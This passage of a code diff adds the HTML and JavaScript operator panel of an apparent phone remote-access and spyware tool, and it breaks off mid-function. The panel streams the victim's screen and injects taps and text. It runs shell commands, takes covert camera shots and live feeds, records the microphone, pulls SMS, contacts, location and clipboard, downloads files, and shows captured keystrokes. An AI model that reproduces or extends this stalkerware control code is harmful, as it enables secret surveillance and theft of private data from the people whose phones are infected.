@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Device Control</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#080c10;--surf:#0f1419;--surf2:#161d26;--border:#1e2a38;
+  --primary:#00c9ff;--green:#00e676;--red:#ff5252;--amber:#ffc107;--dim:#4a6070;
+  --text:#dce8f0;--text2:#8fa8b8;--radius:10px;--font:'Segoe UI',system-ui,sans-serif;
+}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font);font-size:14px;overflow:hidden}
+a{color:var(--primary);text-decoration:none}
+button{cursor:pointer;border:none;outline:none}
+input{outline:none;border:1px solid var(--border);background:var(--surf2);color:var(--text);border-radius:6px;padding:6px 10px;font:inherit}
+input:focus{border-color:var(--primary)}
+
+/* ── Layout ── */
+#app{display:flex;flex-direction:column;height:100vh}
+
+#hdr{
+  display:flex;align-items:center;gap:12px;
+  padding:0 16px;height:52px;min-height:52px;
+  background:var(--surf);border-bottom:1px solid var(--border);
+  flex-shrink:0;
+}
+#hdr a{color:var(--text2);font-size:13px;display:flex;align-items:center;gap:6px;padding:6px 10px;border-radius:6px;transition:background .15s}
+#hdr a:hover{background:var(--surf2);color:var(--text)}
+#devName{font-weight:600;font-size:15px;flex:1}
+#devMeta{color:var(--text2);font-size:12px}
+.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 9px;border-radius:20px;font-size:11px;font-weight:600}
+.badge.online{background:rgba(0,230,118,.12);color:var(--green)}
+.badge.offline{background:rgba(255,82,82,.10);color:var(--red)}
+.badge .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+
+#body{display:flex;flex:1;overflow:hidden}
+
+/* ── Left: phone panel ── */
+#phonePanel{
+  width:310px;min-width:310px;
+  display:flex;flex-direction:column;align-items:center;
+  padding:12px 10px;gap:10px;
+  background:var(--surf);border-right:1px solid var(--border);
+  overflow-y:auto;
+}
+
+.ctrl-bar{display:flex;align-items:center;gap:6px;width:100%}
+.ctrl-bar button{
+  flex:1;padding:6px;border-radius:7px;
+  background:var(--surf2);color:var(--text2);
+  font-size:11px;border:1px solid var(--border);transition:all .15s;
+}
+.ctrl-bar button:hover{background:var(--border);color:var(--text)}
+.ctrl-bar button.active{background:rgba(0,201,255,.15);color:var(--primary);border-color:var(--primary)}
+.fps-lbl{font-size:11px;color:var(--dim);padding:0 4px}
+
+/* ── Phone mockup ── */
+.phone-wrap{position:relative;padding:4px 0}
+.phone{
+  position:relative;width:264px;height:572px;
+  background:linear-gradient(150deg,#1a222c 0%,#0b1018 100%);
+  border-radius:46px;
+  box-shadow:inset 0 0 0 1px rgba(255,255,255,.06),
+             0 0 0 2px #0a0e14,
+             0 28px 80px rgba(0,0,0,.85);
+  padding:9px 7px 8px;flex-shrink:0;
+}
+/* punch hole */
+.phone::before{
+  content:'';position:absolute;top:15px;left:50%;transform:translateX(-50%);
+  width:11px;height:11px;background:#050810;border-radius:50%;
+  box-shadow:0 0 0 1px rgba(255,255,255,.05);z-index:5;
+}
+/* home bar */
+.phone::after{
+  content:'';position:absolute;bottom:10px;left:50%;transform:translateX(-50%);
+  width:84px;height:5px;background:rgba(255,255,255,.18);border-radius:3px;
+}
+.phone-vol-u,.phone-vol-d{position:absolute;left:-3px;width:3px;height:26px;background:#141c26;border-radius:2px 0 0 2px}
+.phone-vol-u{top:90px} .phone-vol-d{top:126px}
+.phone-pwr{position:absolute;right:-3px;top:110px;width:3px;height:42px;background:#141c26;border-radius:0 2px 2px 0}
+
+.phone-screen{
+  width:100%;height:100%;background:#000;border-radius:38px;overflow:hidden;
+  position:relative;display:flex;align-items:center;justify-content:center;
+  cursor:crosshair;user-select:none;
+}
+.phone-screen img{
+  width:100%;height:100%;object-fit:contain;display:block;
+  -webkit-user-drag:none;pointer-events:none;
+}
+.ph-ph{position:absolute;text-align:center;color:#2a3a4a;font-size:12px;line-height:1.8;padding:20px}
+
+/* ── Tap ripple ── */
+.tap-ring{
+  position:fixed;width:36px;height:36px;
+  border:2px solid var(--primary);border-radius:50%;pointer-events:none;
+  transform:translate(-50%,-50%);z-index:9999;
+  animation:tapRipple .45s ease-out forwards;
+}
+@keyframes tapRipple{
+  from{opacity:.9;transform:translate(-50%,-50%) scale(.3)}
+  to{opacity:0;transform:translate(-50%,-50%) scale(1.8)}
+}
+
+/* ── Nav buttons ── */
+#navBar{
+  display:flex;align-items:center;justify-content:space-evenly;
+  width:100%;padding:4px 0;
+}
+#navBar button{
+  width:40px;height:40px;border-radius:50%;
+  background:var(--surf2);border:1px solid var(--border);
+  color:var(--text2);font-size:16px;transition:all .15s;
+}
+#navBar button:hover{background:var(--border);color:var(--text);transform:scale(1.08)}
+#navBar button:active{transform:scale(.94)}
+
+/* ── Text inject ── */
+#textBar{display:flex;gap:6px;width:100%}
+#textInput{flex:1;font-size:12px}
+#textBar button{
+  padding:6px 12px;border-radius:7px;
+  background:var(--primary);color:#000;font-weight:600;font-size:12px;
+  white-space:nowrap;
+}
+#textBar button:hover{opacity:.85}
+
+/* ── Right: tabs ── */
+#tabPanel{flex:1;display:flex;flex-direction:column;overflow:hidden}
+
+#tabBar{
+  display:flex;gap:2px;padding:8px 12px 0;
+  background:var(--surf);border-bottom:1px solid var(--border);
+  flex-shrink:0;overflow-x:auto;
+}
+.tab-btn{
+  padding:8px 16px;border-radius:8px 8px 0 0;border:1px solid transparent;
+  background:transparent;color:var(--text2);font-size:13px;font-weight:500;
+  white-space:nowrap;transition:all .15s;border-bottom:none;
+}
+.tab-btn:hover{color:var(--text);background:var(--surf2)}
+.tab-btn.active{background:var(--bg);color:var(--primary);border-color:var(--border)}
+
+#tabContent{flex:1;overflow-y:auto;padding:16px;background:var(--bg)}
+.tab-panel{display:none;animation:fadeIn .15s}
+.tab-panel.active{display:flex;flex-direction:column;gap:12px}
+@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+
+/* ── Camera tab ── */
+#tab-camera{align-items:center}
+.cam-btns{display:flex;gap:8px;flex-wrap:wrap;justify-content:center}
+.cam-btns button{
+  padding:8px 14px;border-radius:8px;background:var(--surf2);
+  border:1px solid var(--border);color:var(--text);font-size:12px;transition:all .15s;
+}
+.cam-btns button:hover{border-color:var(--primary);color:var(--primary)}
+.cam-btns button.active{background:rgba(0,201,255,.12);border-color:var(--primary);color:var(--primary)}
+
+/* ── Shell tab ── */
+#shellHistory{
+  flex:1;min-height:200px;max-height:420px;overflow-y:auto;
+  background:var(--surf);border:1px solid var(--border);border-radius:var(--radius);
+  padding:10px;font-family:monospace;font-size:12px;line-height:1.6;
+}
+.sh-entry{margin-bottom:10px}
+.sh-cmd{color:var(--primary);margin-bottom:3px}
+.sh-cmd::before{content:'$ ';color:var(--dim)}
+.sh-out{color:var(--text2);white-space:pre-wrap;word-break:break-all}
+.sh-row{display:flex;gap:8px}
+#shellCmd{flex:1;font-family:monospace;font-size:12px}
+.sh-run{
+  padding:7px 16px;border-radius:7px;
+  background:var(--surf2);border:1px solid var(--border);
+  color:var(--text);font-size:12px;white-space:nowrap;transition:all .15s;
+}
+.sh-run:hover{border-color:var(--primary);color:var(--primary)}
+
+/* ── Spy tab ── */
+.spy-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.spy-btn{
+  padding:10px 6px;border-radius:9px;border:1px solid var(--border);
+  background:var(--surf);color:var(--text2);font-size:11px;
+  display:flex;flex-direction:column;align-items:center;gap:5px;transition:all .15s;
+}
+.spy-btn span{font-size:20px}
+.spy-btn:hover{border-color:var(--primary);color:var(--primary);background:rgba(0,201,255,.06)}
+.spy-result{
+  background:var(--surf);border:1px solid var(--border);border-radius:var(--radius);
+  padding:10px;font-family:monospace;font-size:11px;line-height:1.7;
+  white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;color:var(--text2);
+}
+.mic-row{display:flex;gap:8px;align-items:center}
+.mic-row label{color:var(--text2);font-size:12px;display:flex;align-items:center;gap:6px}
+.mic-row input{width:60px;text-align:center}
+.spy-photo{max-width:100%;border-radius:8px;border:1px solid var(--border);cursor:zoom-in;display:none}
+audio{width:100%;display:none}
+
+/* ── Files tab ── */
+.file-row{display:flex;gap:8px}
+.file-row input{flex:1}
+.file-row button,.files-list button{
+  padding:7px 14px;border-radius:7px;background:var(--surf2);
+  border:1px solid var(--border);color:var(--text2);font-size:12px;transition:all .15s;white-space:nowrap;
+}
+.file-row button:hover,.files-list button:hover{border-color:var(--primary);color:var(--primary)}
+.files-list{display:flex;flex-direction:column;gap:6px}
+.file-item{
+  display:flex;align-items:center;gap:8px;
+  padding:8px 10px;border-radius:8px;background:var(--surf);border:1px solid var(--border);
+  font-size:12px;
+}
+.file-item .fname{flex:1;color:var(--text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.file-item .fsize{color:var(--dim);font-size:11px}
+
+/* ── Keylog tab ── */
+.kl-ctrl{display:flex;gap:8px;align-items:center}
+.kl-ctrl button{
+  padding:7px 14px;border-radius:7px;background:var(--surf2);
+  border:1px solid var(--border);color:var(--text2);font-size:12px;transition:all .15s;
+}
+.kl-ctrl button:hover{border-color:var(--primary);color:var(--primary)}
+.kl-ctrl label{color:var(--text2);font-size:12px;display:flex;align-items:center;gap:6px;cursor:pointer}
+#keylogArea{
+  flex:1;min-height:300px;
+  background:var(--surf);border:1px solid var(--border);border-radius:var(--radius);
+  padding:10px;font-family:monospace;font-size:11px;line-height:1.7;
+  overflow-y:auto;color:var(--text2);
+}
+.kl-entry{display:flex;gap:8px;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)}
+.kl-ts{color:var(--dim);min-width:70px;font-size:10px}
+.kl-type{min-width:44px;font-size:10px;font-weight:600;border-radius:4px;padding:1px 5px;text-align:center}
+.kl-key{background:rgba(0,201,255,.12);color:var(--primary)}
+.kl-text{background:rgba(0,230,118,.10);color:var(--green)}
+.kl-focus{background:rgba(255,193,7,.10);color:var(--amber)}
+.kl-data{flex:1;word-break:break-all}
+
+/* ── Fullscreen overlay ── */
+#fsOv{
+  display:none;position:fixed;inset:0;background:#000;z-index:9998;
+  align-items:center;justify-content:center;cursor:zoom-out;
+}
+#fsOv.open{display:flex}
+#fsOv img{max-width:100%;max-height:100%;object-fit:contain;pointer-events:none}
+#fsBtnClose{position:fixed;top:16px;right:16px;z-index:9999;background:rgba(0,0,0,.7);border:1px solid #333;color:#fff;width:36px;height:36px;border-radius:50%;font-size:18px;line-height:1}
+#fsBtnFs{position:fixed;top:16px;right:58px;z-index:9999;background:rgba(0,0,0,.7);border:1px solid #333;color:#fff;padding:6px 10px;border-radius:7px;font-size:12px}
+
+/* ── Toast ── */
+#toast{
+  position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
+  background:var(--surf2);border:1px solid var(--border);border-radius:8px;
+  padding:8px 16px;font-size:12px;color:var(--text);
+  opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;
+}
+#toast.show{opacity:1}
+
+@media(max-width:700px){
+  #body{flex-direction:column;overflow-y:auto}
+  #phonePanel{width:100%;min-width:unset;border-right:none;border-bottom:1px solid var(--border)}
+}
+</style>
+</head>
+<body>
+<div id="app">
+  <!-- Header -->
+  <header id="hdr">
+    <a href="/">&#8592; Devices</a>
+    <div>
+      <div id="devName">Loading…</div>
+      <div id="devMeta"></div>
+    </div>
+    <div style="margin-left:auto;display:flex;align-items:center;gap:8px">
+      <span id="devBadge" class="badge offline"><span class="dot"></span>offline</span>
+    </div>
+  </header>
+
+  <div id="body">
+    <!-- Left: Phone -->
+    <div id="phonePanel">
+      <!-- Live/snap controls -->
+      <div class="ctrl-bar">
+        <button id="btnLive" onclick="toggleLive()">&#9654; Live</button>
+        <button onclick="snapScreen()">&#128247; Snap</button>
+        <span class="fps-lbl" id="screenFps">-- fps</span>
+        <button onclick="fsOpen('screen')">&#8263;</button>
+      </div>
+
+      <!-- Phone mockup -->
+      <div class="phone-wrap">
+        <div class="phone">
+          <div class="phone-vol-u"></div>
+          <div class="phone-vol-d"></div>
+          <div class="phone-pwr"></div>
+          <div class="phone-screen" id="phoneScreen"
+               onmousedown="tapStart(event)" onmouseup="tapEnd(event)"
+               ontouchstart="tapStartT(event)" ontouchend="tapEndT(event)">
+            <img id="screenImg" src="" alt="" style="display:none">
+            <div class="ph-ph" id="screenPh">No screen feed<br>Press Live or Snap</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Navigation buttons -->
+      <div id="navBar">
+        <button onclick="sendKey('BACK')" title="Back">&#9668;</button>
+        <button onclick="sendKey('HOME')" title="Home">&#9679;</button>
+        <button onclick="sendKey('RECENT')" title="Recent">&#9632;</button>
+        <button onclick="doWake()" title="Wake Screen" style="font-size:13px">&#9728;</button>
+        <button onclick="sendKey('NOTIFICATIONS')" title="Notifications" style="font-size:13px">&#128276;</button>
+        <button onclick="sendKey('LOCK')" title="Lock Screen" style="font-size:13px">&#128274;</button>
+      </div>
+
+      <!-- Text injection -->
+      <div id="textBar">
+        <input id="textInput" type="text" placeholder="Type text to inject…" onkeydown="if(event.key==='Enter')sendText()">
+        <button onclick="sendText()">&#9000; Send</button>
+      </div>
+    </div>
+
+    <!-- Right: Tab panel -->
+    <div id="tabPanel">
+      <div id="tabBar">
+        <button class="tab-btn active" onclick="switchTab('camera')">&#128247; Camera</button>
+        <button class="tab-btn" onclick="switchTab('shell')">&#128187; Shell</button>
+        <button class="tab-btn" onclick="switchTab('spy')">&#128065; Spy</button>
+        <button class="tab-btn" onclick="switchTab('files')">&#128193; Files</button>
+        <button class="tab-btn" onclick="switchTab('keylog')">&#9000; Keylog</button>
+      </div>
+      <div id="tabContent">
+
+        <!-- Camera -->
+        <div id="tab-camera" class="tab-panel active">
+          <div class="cam-btns">
+            <button onclick="snapCam(false)">&#128247; Back Snap</button>
+            <button onclick="snapCam(true)">&#129333; Front Snap</button>
+            <button id="btnCamLive" onclick="toggleCamLive(false)">&#9654; Back Live</button>
+            <button id="btnCamLiveF" onclick="toggleCamLive(true)">&#9654; Front Live</button>
+            <span class="fps-lbl" id="camFps">-- fps</span>
+            <button onclick="fsOpen('cam')">&#8263;</button>
+          </div>
+          <div class="phone-wrap">
+            <div class="phone">
+              <div class="phone-screen" id="camScreen" style="cursor:default">
+                <img id="camImg" src="" alt="" style="display:none">
+                <div class="ph-ph" id="camPh">Tap a camera button above</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Shell -->
+        <div id="tab-shell" class="tab-panel">
+          <div id="shellHistory"></div>
+          <div class="sh-row">
+            <input id="shellCmd" type="text" placeholder="Shell command…" onkeydown="if(event.key==='Enter')runShell()">
+            <button class="sh-run" onclick="runShell()">&#9658; Run</button>
+          </div>
+        </div>
+
+        <!-- Spy -->
+        <div id="tab-spy" class="tab-panel">
+          <div class="spy-grid">
+            <button class="spy-btn" onclick="spyCmd('__loc__')"><span>&#128205;</span>Location</button>
+            <button class="spy-btn" onclick="spyCmd('__clip__')"><span>&#128203;</span>Clipboard</button>
+            <button class="spy-btn" onclick="spyCmd('__sms__')"><span>&#128172;</span>SMS</button>
+            <button class="spy-btn" onclick="spyCmd('__contacts__')"><span>&#128101;</span>Contacts</button>
+            <button class="spy-btn" onclick="spyCam(false)"><span>&#128247;</span>Back Cam</button>
+            <button class="spy-btn" onclick="spyCam(true)"><span>&#129333;</span>Front Cam</button>
+          </div>
+          <div class="mic-row">
+            <label>Duration: <input id="micDur" type="number" value="10" min="1" max="60"> s</label>
+            <button class="spy-btn" style="flex-direction:row;padding:8px 14px" onclick="spyMic()"><span>&#127908;</span> Record Mic</button>
+          </div>
+          <audio id="spyAudio" controls></audio>
+          <img id="spyPhoto" class="spy-photo" onclick="fsOpenSrc(this.src)">
+          <div id="spyResult" class="spy-result">— results appear here —</div>
+        </div>
+
+        <!-- Files -->
+        <div id="tab-files" class="tab-panel">
+          <div class="file-row">
+            <input id="dlPath" type="text" placeholder="/sdcard/DCIM/photo.jpg">
+            <button onclick="fetchFile()">&#11014; Fetch from Device</button>
+          </div>
+          <div id="fileList" class="files-list"></div>
+        </div>
+
+        <!-- Keylog -->
+        <div id="tab-keylog" class="tab-panel">
+          <div class="kl-ctrl">
+            <button onclick="fetchKeylog()">&#8635; Refresh</button>
+            <button onclick="clearKeylog()">&#128465; Clear</button>
+            <label><input type="checkbox" id="klAuto" onchange="setKlAuto(this.checked)"> Auto-refresh 5s</label>
+          </div>
+          <div id="keylogArea">— no keystrokes captured yet —</div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Fullscreen overlay -->
+<div id="fsOv" onclick="fsClose()">
+  <button id="fsBtnClose" onclick="event.stopPropagation();fsClose()">&#10005;</button>
+  <button id="fsBtnFs" onclick="event.stopPropagation();fsNative()">&#8263; Native</button>
+  <img id="fsImg" src="" alt="">
+</div>
+<div id="toast"></div>
+
+<script>
+'use strict';
+const did = new URLSearchParams(location.search).get('did') || '';
+let liveEs = null, camEs = null, klTimer = null;
+let _tapStart = null;
+let _screenFps = 0, _camFps = 0, _screenFt = 0, _camFt = 0;
+let _lastScreenSrc = '', _lastCamSrc = '';
+
+// ── Auth + API helpers ──────────────────────────────────────────────────────
+async function apiFetch(url, opts={}) {
+  const r = await fetch(url, opts);
+  if (r.status === 401) { location.href = '/'; return null; }
+  return r;
+}
+async function apiJson(url, opts={}) {
+  const r = await apiFetch(url, opts);
+  if (!r) return null;
+  return r.ok ? r.json() : null;
+}
+async function sendCmd(cmd) {
+  if (!did) return;
+  return apiJson(`/api/devices/${did}/cmd`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({cmd})
+  });
+}
+
+// ── Init ────────────────────────────────────────────────────────────────────
+async function init() {
+  if (!did) { document.getElementById('devName').textContent = 'No device ID'; return; }
+  await loadDevInfo();
+  setInterval(loadDevInfo, 10000);
+  await loadHistory();
+  setInterval(loadHistory, 5000);
+  setInterval(updateFps, 1000);
+}
+
+async function loadDevInfo() {
+  const devs = await apiJson('/api/devices');
+  if (!devs) return;
+  const dev = devs.find(d => d.id === did);
+  if (!dev) return;
+  document.getElementById('devName').textContent = dev.hostname || dev.id;
+  document.getElementById('devMeta').textContent = dev.os + ' · ' + dev.arch;
+  const badge = document.getElementById('devBadge');
+  badge.className = 'badge ' + (dev.online ? 'online' : 'offline');
+  badge.innerHTML = '<span class="dot"></span>' + (dev.online ? 'online' : 'offline');
+  document.title = (dev.hostname || 'Device') + ' — Control';
+}
+
+async function loadHistory() {
+  const data = await apiJson(`/api/devices/${did}/history`);
+  if (!data) return;
+  const hist = data.history || [];
+  const box = document.getElementById('shellHistory');
+  const atBottom = box.scrollTop + box.clientHeight >= box.scrollHeight - 20;
+  const entries = hist.slice(0, 30).reverse();
+  box.innerHTML = entries.map(e => `
+    <div class="sh-entry">
+      <div class="sh-cmd">${esc(e.cmd)}</div>
+      <div class="sh-out">${esc(e.out || '')}</div>
+    </div>`).join('');
+  if (atBottom) box.scrollTop = box.scrollHeight;
+}
+
+function updateFps() {
+  const now = Date.now();
+  document.getElementById('screenFps').textContent = _screenFps + ' fps';
+  document.getElementById('camFps').textContent = _camFps + ' fps';
+  _screenFps = 0; _camFps = 0;
+}
+
+// ── Screen Live ─────────────────────────────────────────────────────────────
+function toggleLive() {
+  if (liveEs) { stopLive(); return; }
+  liveEs = new EventSource(`/api/devices/${did}/screen-stream`);
+  liveEs.onmessage = e => {
+    const src = 'data:image/jpeg;base64,' + e.data;
+    const img = document.getElementById('screenImg');
+    img.src = src; img.style.display = 'block';
+    document.getElementById('screenPh').style.display = 'none';
+    _lastScreenSrc = src; _screenFps++;
+    // sync fullscreen if open on screen source
+    const fsI = document.getElementById('fsImg');
+    if (document.getElementById('fsOv').classList.contains('open') && fsI.dataset.src === 'screen')
+      fsI.src = src;
+  };
+  liveEs.onerror = () => stopLive();
+  document.getElementById('btnLive').textContent = '⏹ Stop';
+  document.getElementById('btnLive').classList.add('active');
+}
+
+function stopLive() {
+  if (liveEs) { liveEs.close(); liveEs = null; }
+  document.getElementById('btnLive').textContent = '▶ Live';
+  document.getElementById('btnLive').classList.remove('active');
+}
+
+async function snapScreen() {
+  await sendCmd('__screenshot__');
+  // Poll once quickly
+  setTimeout(async () => {
+    const r = await apiFetch(`/api/devices/${did}/screenshot`);
+    if (!r || !r.ok) return;
+    const blob = await r.blob();
+    const src = URL.createObjectURL(blob);
+    const img = document.getElementById('screenImg');
+    img.src = src; img.style.display = 'block';
+    document.getElementById('screenPh').style.display = 'none';
+    _lastScreenSrc = src;
+  }, 1200);
+  toast('Screenshot requested');
+}
+
+// ── Camera Live ─────────────────────────────────────────────────────────────
+function toggleCamLive(front) {
+  if (camEs) { stopCamLive(); return; }
+  sendCmd(front ? '__cam_live_front__' : '__cam_live_on__');
+  camEs = new EventSource(`/api/devices/${did}/cam-stream`);
+  camEs.onmessage = e => {
+    const src = 'data:image/jpeg;base64,' + e.data;
+    const img = document.getElementById('camImg');
+    img.src = src; img.style.display = 'block';
+    document.getElementById('camPh').style.display = 'none';
+    _lastCamSrc = src; _camFps++;
+    const fsI = document.getElementById('fsImg');
+    if (document.getElementById('fsOv').classList.contains('open') && fsI.dataset.src === 'cam')
+      fsI.src = src;
+  };
+  camEs.onerror = () => stopCamLive();
+  const btn = front ? 'btnCamLiveF' : 'btnCamLive';
+  document.getElementById(btn).textContent = '⏹ Stop ' + (front?'Front':'Back');
+  document.getElementById(btn).classList.add('active');
+}
+
+function stopCamLive() {
+  if (camEs) { camEs.close(); camEs = null; }
+  sendCmd('__cam_live_off__');
+  ['btnCamLive','btnCamLiveF'].forEach(id => {
+    const b = document.getElementById(id);
+    b.classList.remove('active');
+    b.textContent = b.id === 'btnCamLive' ? '▶ Back Live' : '▶ Front Live';
+  });
+}
+
+async function snapCam(front) {
+  const cmd = front ? '__cam_front__' : '__cam__';
+  await sendCmd(cmd);
+  toast('Camera snap sent');
+  setTimeout(loadLatestCamPhoto, 3000);
+}
+
+async function loadLatestCamPhoto() {
+  const r = await apiFetch(`/api/devices/${did}/photo`);
+  if (!r || !r.ok) return;
+  const blob = await r.blob();
+  const src = URL.createObjectURL(blob);
+  const img = document.getElementById('camImg');
+  img.src = src; img.style.display = 'block';
+  document.getElementById('camPh').style.display = 'none';
+  _lastCamSrc = src;
+}
+
+// ── Tap / Swipe interaction ──────────────────────────────────────────────────
+function tapStart(e) {
+  const rect = e.currentTarget.getBoundingClientRect();
+  _tapStart = {
+    x: (e.clientX - rect.left) / rect.width,
+    y: (e.clientY - rect.top)  / rect.height,
+    cx: e.clientX, cy: e.clientY, t: Date.now()
+  };
+  e.preventDefault();
+}
+
+function tapEnd(e) {
+  if (!_tapStart) return;
+  const rect = e.currentTarget.getBoundingClientRect();
+  const ex = (e.clientX - rect.left) / rect.width;
+  const ey = (e.clientY - rect.top)  / rect.height;
+  _finishGesture(ex, ey, e.clientX, e.clientY);
+}
+
+function tapStartT(e) {
+  if (!e.touches.length) return;
+  const t = e.touches[0];
+  const rect = e.currentTarget.getBoundingClientRect();
+  _tapStart = {
+    x: (t.clientX - rect.left) / rect.width,
+    y: (t.clientY - rect.top)  / rect.height,
+    cx: t.clientX, cy: t.clientY, t: Date.now()
+  };
+  e.preventDefault();
+}
+
+function tapEndT(e) {
+  if (!_tapStart || !e.changedTouches.length) return;
+  const t = e.changedTouches[0];
+  const rect = e.currentTarget.getBoundingClientRect();
+  const ex = (t.clientX - rect.left) / rect.width;
+  const ey = (t.clientY - rect.top)  / rect.height;
+  _finishGesture(ex, ey, t.clientX, t.clientY);
+}
+
+function _finishGesture(ex, ey, cx, cy) {
+  if (!_tapStart || !did) { _tapStart = null; return; }
+  const dx = ex - _tapStart.x, dy = ey - _tapStart.y;
+  const dist = Math.sqrt(dx*dx + dy*dy);
+  const dur  = Date.now() - _tapStart.t;
+  if (dist > 0.025) {
+    const swipeDur = Math.max(200, Math.min(1200, dur));
+    sendCmd(`__swipe:${_tapStart.x.toFixed(4)},${_tapStart.y.toFixed(4)},${ex.toFixed(4)},${ey.toFixed(4)},${swipeDur}__`);
+    showRipple(_tapStart.cx, _tapStart.cy);
+    showRipple(cx, cy);
+  } else {
+    sendCmd(`__tap:${ex.toFixed(4)},${ey.toFixed(4)}__`);
+    showRipple(cx, cy);
+  }
+  _tapStart = null;
+}
+
+function showRipple(cx, cy) {
+  const r = document.createElement('div');
+  r.className = 'tap-ring';
+  r.style.left = cx + 'px'; r.style.top = cy + 'px';
+  document.body.appendChild(r);
+  setTimeout(() => r.remove(), 500);
+}
+
+// ── Nav / system keys ────────────────────────────────────────────────────────
+function sendKey(action) { sendCmd(`__key:${action}__`); toast(action); }
+function doWake()        { sendCmd('__wake__'); toast('Wake sent'); }
+function sendText() {
+  const v = document.getElementById('textInput').value.trim();
+  if (!v) return;
+  sendCmd('__text:' + v + '__');
+  document.getElementById('textInput').value = '';
+  toast('Text injected');
+}
+
+// ── Shell ────────────────────────────────────────────────────────────────────
+async function runShell() {
+  const inp = document.getElementById('shellCmd');
+  const cmd = inp.value.trim();
+  if (!cmd) return;
+  inp.value = '';
+  await sendCmd(cmd);
+  setTimeout(loadHistory, 2000);
+}
+
+// ── Spy ──────────────────────────────────────────────────────────────────────
+async function spyCmd(cmd) {
+  await sendCmd(cmd);
+  document.getElementById('spyResult').textContent = 'Waiting for result…';
+  setTimeout(() => loadSpyResult(cmd), 3000);
+}
+
+async function spyCam(front) { await snapCam(front); switchTab('spy'); }
+
+async function spyMic() {
+  const dur = document.getElementById('micDur').value || 10;
+  await sendCmd('__mic:' + dur + '__');
+  toast('Recording ' + dur + 's…');
+  setTimeout(() => loadAudio(), (parseInt(dur) + 2) * 1000);
+}
+
+async function loadSpyResult(cmd) {
+  const data = await apiJson(`/api/devices/${did}/history`);
+  if (!data) return;
+  const entry = (data.history || []).find(e => e.cmd === cmd);
+  if (entry) document.getElementById('spyResult').textContent = entry.out || '(empty)';
+  // Photo
+  if (cmd === '__cam__' || cmd === '__cam_front__') {
+    const r = await apiFetch(`/api/devices/${did}/photo`);
+    if (r && r.ok) {
+      const blob = await r.blob();
+      const img = document.getElementById('spyPhoto');
+      img.src = URL.createObjectURL(blob);
+      img.style.display = 'block';
+    }
+  }
+}
+
+async function loadAudio() {
+  const r = await apiFetch(`/api/devices/${did}/audio`);
+  if (!r || !r.ok) return;
+  const blob = await r.blob();
+  const audio = document.getElementById('spyAudio');
+  audio.src = URL.createObjectURL(blob);
+  audio.style.display = 'block';
+  toast('Audio ready');
+}
+
+// ── Files ────────────────────────────────────────────────────────────────────
+async function fetchFile() {
+  const path = document.getElementById('dlPath').value.trim();
+  if (!path) return;
+  await sendCmd('__upload:' + path + '__');
+  toast('Fetching file…');
+  setTimeout(loadFileList, 4000);
+}
+
+async function loadFileList() {
+  const data = await apiJson(`/api/devices/${did}/files`);
+  if (!data) return;
+  const files = data.files || [];
+  const box = document.getElementById('fileList');
+  if (!files.length) { box.innerHTML = '<div style="color:var(--dim);font-size:12px">No files yet</div>'; return; }
+  box.innerHTML = files.map(f => `
+    <div class="file-item">
+      <div class="fname">${esc(f.name)}</div>
+      <div class="fsize">${fmtSize(f.size)}</div>
+      <button onclick="dlFile('${esc(f.name)}')">&#11015; Download</button>
+    </div>`).join('');
+}
+
+function dlFile(name) {
+  const a = document.createElement('a');
+  a.href = `/api/devices/${did}/files/${encodeURIComponent(name)}`;
+  a.download = name;
+  a.click();
+}
+
+// ── Keylog ───────────────────────────────────────────────────────────────────
+async function fetchKeylog() {
+  const data = await apiJson(`/api/devices/${did}/keylog`);
+  if (!data) return;
+  const entries = data.entries || [];
+  const box = document.getElementById('keylogArea');
+  if (!entries.length) { box.textContent = '— no keystrokes captured yet —'; return; }
+  box.innerHTML = entries.map(e => {
+    const t = e.type || 'key';
+    const ts = e.srv_ts || '--:--:--';
+    const cls = t === 'key' ? 'kl-key' : t === 'text' ? 'kl-text' : 'kl-focus';
+    const label = t === 'focus' ? 'APP' : t.toUpperCase();
+    const data2 = t === 'text' ? `[${e.pkg || '?'}] ${e.data}` : t === 'focus' ? `${e.pkg}/${e.data}` : e.data;
+    return `<div class="kl-entry">
+      <span class="kl-ts">${ts}</span>
+      <span class="kl-type ${cls}">${label}</span>
+      <span class="kl-data">${esc(data2 || '')}</span>
+    </div>`;
+  }).join('');
+  box.scrollTop = box.scrollHeight;
+}
+
+async function clearKeylog() {
+  await apiFetch(`/api/devices/${did}/keylog/clear`, {method:'POST'});
+  document.getElementById('keylogArea').textContent = '— cleared —';
+  toast('Keylog cleared');
+}
+
+let _klAutoTimer = null;
+function setKlAuto(on) {
+  if (_klAutoTimer) { clearInterval(_klAutoTimer); _klAutoTimer = null; }
+  if (on) { _klAutoTimer = setInterval(fetchKeylog, 5000); fetchKeylog(); }
+}
+
+// ── Tabs ─────────────────────────────────────────────────────────────────────
+function switchTab(name) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  event.currentTarget.classList.add('active');
+  if (name === 'files') loadFileList();
+  if (name === 'keylog') fetchKeylog();
+}
+
+// ── Fullscreen ───────────────────────────────────────────────────────────────
+function fsOpen(src) {
+  const fsI = document.getElementById('fsImg');
+  fsI.src = src === 'screen' ? (_lastScreenSrc || '') : (_lastCamSrc || '');
+  fsI.dataset.src = src;
+  document.getElementById('fsOv').classList.add('open');
+  document.addEventListener('keydown', fsEsc);
+}
+function fsOpenSrc(src) {
+  const fsI = document.getElementById('fsImg');
+  fsI.src = src; fsI.dataset.src = '';
